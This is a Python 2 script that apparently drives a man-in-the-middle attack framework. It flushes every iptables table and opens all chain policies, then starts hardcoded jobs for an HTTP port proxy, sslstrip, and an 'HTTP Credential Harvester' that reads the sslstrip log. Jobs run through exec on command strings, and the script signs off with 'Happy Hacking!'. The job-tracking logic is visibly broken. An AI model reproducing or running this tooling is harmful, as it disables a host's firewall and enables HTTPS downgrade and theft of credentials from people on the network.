import os
import re
import sys
import time
import warnings


os.system('iptables -F')
os.system('iptables -X')
os.system('iptables -t nat -F')
os.system('iptables -t nat -X')
os.system('iptables -t mangle -F')
os.system('iptables -t mangle -X')
os.system('iptables -P INPUT ACCEPT')
os.system('iptables -P FORWARD ACCEPT')
os.system('iptables -P OUTPUT ACCEPT')
      

#Import DB Libs
#from lib.GUIServer import *

#Import Attack Libs
from lib.feeds import *
from lib.metafeeds import *
from lib.consumers import *


def getJobs(a):
   print "Retrieveing job details"
   
   #Get jobs from DB
   if a == "0":
      jobs = [["HTTP Proxy", "1", "0", "rawPacket().portProxy(a);80,10000"], ["sslstrip", "1", "0", "sslstrip().proxy(a);10000"], ["HTTP Credential Harvester", "1", "0", "harvester().httpHarvester(a);../sslstrip.log"], ["Test", "0", "1", "tmp"], ["Test2", "1", "1", "tmp2"]]
      
   else:
      jobs = []
   
   return jobs

def execJob(name, cmdstring):
   #Build job
   exp = cmdstring.split(";")
   
   try:
      a = exp[1]
   except:
      #No args
      pass
   
   #Invoke Job
   #Invokes the module class and passes a comma delimited argument list
   print "Invoking job: " + name
   exec exp[0]

   
def cleanJobs():
   print "Cleaning up..."
   #Pull db job info
   #Gracefully close tasks
   
   print "Happy Hacking!"
   exit()
   
#MITMServer should be spawned as a background process PID tracked in DB and killed on stop (Ctrl-Z)
#Check if MITMServer already running (via jobs?)

a = "0"

#Main Execution
while True:
   #Check settings for active attack components
   jobs = getJobs(a)

   for job in jobs:      
      #Startup new jobs
      if job[1] == "1" and job[2] == "0":
         a = "1"
         
         #Spawn new job
         name = job[0]
         cmdstring = job[3]
         pid = execJob(name, cmdstring)
         
         #Track job pid
         print pid
         
         print "Starting new job " + name
         
      #Stop deactivated jobs
      if job[0] == "1" and job[2] == "1":
         print "Stopping job " + job[1]
         
   time.sleep(1)


#Add try/except handler to catch keyboard interrupt and kill all jobs